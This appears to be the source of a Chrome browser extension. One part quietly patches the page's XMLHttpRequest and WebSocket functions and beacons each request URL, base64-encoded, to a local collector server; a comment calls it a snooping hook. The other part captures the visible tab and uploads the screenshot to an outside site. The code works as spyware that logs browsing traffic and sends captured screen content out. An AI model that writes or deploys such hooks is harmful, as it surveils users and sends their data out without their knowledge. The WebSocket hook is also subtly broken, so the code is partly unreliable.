function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var id = 100;

function takeScreenshot() {
  chrome.extension.sendMessage({'action': 'status_update', 'msg': 'Capturing..'});
  chrome.tabs.captureVisibleTab(null, function(img) {
    var screenshotUrl = img;
    chrome.extension.sendMessage({'action': 'status_update', 'msg': 'Captured image... sharina...'});
    var viewTabUrl = chrome.extension.getURL('screenshot.html?id=' + id++)
    var http = new XMLHttpRequest();
    http.open("POST", "http://www.sharequickly.info/", true);
    http.onreadystatechange = function() {//Call a function when the state changes.
      if(http.readyState == 4 && http.status == 200) {
        chrome.extension.sendMessage({'action': 'status_update', 'msg': 'Shared....'});
	viewTabUrl = http.responseText;
	chrome.tabs.create({url: viewTabUrl}, function(tab) {
	  var targetId = tab.id;

	  var addSnapshotImageToTab = function(tabId, changedProps) {
	    if (tabId != targetId || changedProps.status != "complete")
	    return;
	    chrome.tabs.onUpdated.removeListener(addSnapshotImageToTab);
	    var views = chrome.extension.getViews();
	    for (var i = 0; i < views.length; i++) {
	      var view = views[i];
	      if (view.location.href == viewTabUrl) {
		view.setScreenshotUrl(screenshotUrl);
		break;
	      }
	    }
	  };
	  chrome.tabs.onUpdated.addListener(addSnapshotImageToTab);
	});
      }
    }

    var regex = /^data:.+\/(.+);base64,(.*)$/;
    var matches = screenshotUrl.match(regex);
    var ext = matches[1];
    var data = matches[2];
    var params = 'c=upload&type='+ext+'&content='+data;
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.send(params);
    chrome.extension.sendMessage({'action': 'status_update', 'msg': 'Uploaded image....'});

  });
}

// Listen for a click on the camera icon.  On that click, take a screenshot.
chrome.browserAction.onClicked.addListener(function(tab) {
  takeScreenshot();
});
